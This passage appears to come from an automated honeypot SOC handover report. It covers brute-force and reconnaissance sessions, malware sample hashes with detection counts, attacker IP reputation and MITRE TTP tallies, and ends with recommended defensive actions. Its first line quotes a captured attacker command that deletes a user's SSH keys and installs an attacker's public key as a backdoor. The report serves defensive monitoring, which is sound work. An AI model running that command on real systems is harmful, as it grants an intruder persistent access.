| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 20:56:37` | `cowrie.session.connect` |
| `2026-06-17 20:56:37` | `cowrie.client.version` |
| `2026-06-17 20:56:37` | `cowrie.client.kex` |
| `2026-06-17 20:56:37` | `cowrie.login.success` |
| `2026-06-17 20:56:38` | `cowrie.session.params` |
| `2026-06-17 20:56:38` | `cowrie.command.input` |
| `2026-06-17 20:56:38` | `cowrie.command.failed` |
| `2026-06-17 20:56:38` | `cowrie.log.closed` |
| `2026-06-17 20:56:38` | `cowrie.session.params` |
| `2026-06-17 20:56:38` | `cowrie.command.input` |
| `2026-06-17 20:56:38` | `cowrie.session.file_download` |
| `2026-06-17 20:56:38` | `cowrie.log.closed` |
| `2026-06-17 20:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.184.144[.]232` to AbuseIPDB if not already reported
- [ ] Block `121.184.144[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9772e3ff6dc7

| Field | Detail |
|---|---|
| **Source IP** | `121.184.144[.]232` |
| **First Seen** | 2026-06-17 20:56 |
| **Last Seen** | 2026-06-17 20:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 20:56:40` | `cowrie.session.connect` |
| `2026-06-17 20:56:40` | `cowrie.client.version` |
| `2026-06-17 20:56:40` | `cowrie.client.kex` |
| `2026-06-17 20:56:41` | `cowrie.login.success` |
| `2026-06-17 20:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.184.144[.]232` to AbuseIPDB if not already reported
- [ ] Block `121.184.144[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `150.95.66[.]172` | **56** | 2026-06-17 18:32 | 2026-06-17 21:54 | 34m | 0 | `T1592` | 🟠 MEDIUM |
| `36.212.227[.]224` | **30** | 2026-06-17 18:22 | 2026-06-17 18:28 | 56m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.135.59[.]203` | **25** | 2026-06-17 19:01 | 2026-06-17 19:06 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `172.202.9[.]120` | **20** | 2026-06-17 20:21 | 2026-06-17 21:10 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `198.12.150[.]45` | **14** | 2026-06-17 18:30 | 2026-06-17 21:54 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `103.130.213[.]223` | **2** | 2026-06-17 19:25 | 2026-06-17 19:28 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.126[.]104` | **2** | 2026-06-17 20:40 | 2026-06-17 20:42 | 4m | 0 | `T1592` | 🟢 LOW |
| `192.210.203[.]201` | **2** | 2026-06-17 19:58 | 2026-06-17 20:31 | 2m | 0 | `T1592` | 🟢 LOW |
| `27.45.244[.]134` | **2** | 2026-06-17 19:26 | 2026-06-17 19:26 | 1m | 0 | `T1592` | 🟢 LOW |
| `45.61.187[.]220` | **2** | 2026-06-17 20:45 | 2026-06-17 20:50 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.212.225[.]99` | 1 | 2026-06-17 20:15 | 2026-06-17 20:15 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.147.182[.]181` | 1 | 2026-06-17 19:38 | 2026-06-17 19:39 | 30s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]70` | 1 | 2026-06-17 21:32 | 2026-06-17 21:33 | 27s | 0 | `T1592` | 🟢 LOW |
| `117.50.185[.]190` | 1 | 2026-06-17 19:51 | 2026-06-17 19:52 | 26s | 0 | `T1592` | 🟢 LOW |
| `119.199.129[.]143` | 1 | 2026-06-17 20:25 | 2026-06-17 20:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.194.50[.]39` | 1 | 2026-06-17 21:14 | 2026-06-17 21:16 | 70s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]81` | 1 | 2026-06-17 20:48 | 2026-06-17 20:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.15.140[.]235` | 1 | 2026-06-17 19:01 | 2026-06-17 19:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.184.144[.]232` | 1 | 2026-06-17 20:56 | 2026-06-17 20:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.70.97[.]100` | 1 | 2026-06-17 21:06 | 2026-06-17 21:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.201.116[.]242` | 1 | 2026-06-17 21:57 | 2026-06-17 21:57 | 12s | 0 | `T1592` | 🟢 LOW |
| `138.118.215[.]192` | 1 | 2026-06-17 19:33 | 2026-06-17 19:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `138.2.52[.]32` | 1 | 2026-06-17 18:35 | 2026-06-17 18:36 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]110` | 1 | 2026-06-17 18:30 | 2026-06-17 18:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.230.150[.]187` | 1 | 2026-06-17 21:58 | 2026-06-17 21:59 | 40s | 0 | `T1592` | 🟢 LOW |
| `165.154.254[.]143` | 1 | 2026-06-17 20:37 | 2026-06-17 20:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.72.87[.]7` | 1 | 2026-06-17 20:45 | 2026-06-17 20:45 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.86.43[.]85` | 1 | 2026-06-17 21:25 | 2026-06-17 21:26 | 30s | 0 | `T1592` | 🟢 LOW |
| `210.4.68[.]72` | 1 | 2026-06-17 21:44 | 2026-06-17 21:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.129.236[.]174` | 1 | 2026-06-17 19:20 | 2026-06-17 19:20 | 26s | 0 | `T1592` | 🟢 LOW |
| `222.73.56[.]10` | 1 | 2026-06-17 18:23 | 2026-06-17 18:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.107.102[.]154` | 1 | 2026-06-17 21:33 | 2026-06-17 21:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.173.2[.]182` | 1 | 2026-06-17 21:15 | 2026-06-17 21:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.114.49[.]47` | 1 | 2026-06-17 19:25 | 2026-06-17 19:26 | 30s | 0 | `T1592` | 🟢 LOW |
| `39.164.91[.]67` | 1 | 2026-06-17 21:31 | 2026-06-17 21:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.164.192[.]38` | 1 | 2026-06-17 20:19 | 2026-06-17 20:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.120.216[.]232` | 1 | 2026-06-17 18:34 | 2026-06-17 18:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.192.197[.]86` | 1 | 2026-06-17 20:20 | 2026-06-17 20:21 | 30s | 0 | `T1592` | 🟢 LOW |
| `78.186.54[.]65` | 1 | 2026-06-17 20:33 | 2026-06-17 20:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.209.226[.]128` | 1 | 2026-06-17 19:12 | 2026-06-17 19:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `8.219.82[.]137` | 1 | 2026-06-17 21:51 | 2026-06-17 21:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `85.121.51[.]5` | 1 | 2026-06-17 20:58 | 2026-06-17 20:58 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `192.210.203[.]201` | US | RackNerd LLC | **100** ⚠️ | 1 |
| `150.95.66[.]172` | TH | ZCOM THAI EP | **100** ⚠️ | 3 |
| `31.173.2[.]182` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `138.2.52[.]32` | JP | Oracle Corporation | **100** ⚠️ | 2 |
| `219.129.236[.]174` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `1.212.225[.]99` | KR | LG Uplus | **100** ⚠️ | 50 |
| `45.192.197[.]86` | JP | Akile LTD | **100** ⚠️ | 2 |
| `138.118.215[.]192` | AR | Sebastian Souto (SSSERVICIOS) | **100** ⚠️ | 21 |
| `14.103.126[.]104` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `177.72.87[.]7` | BR | BRMOM CONSTRUINDO CONEXOES LTDA | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 60 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 39 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 212 cases |
| Tool 34  | Credential Extractor        | ✅ 49 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 57 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (7.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 42 recon entry/entries in table (10 group(s) consolidating 155 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-17T22:04:39Z_
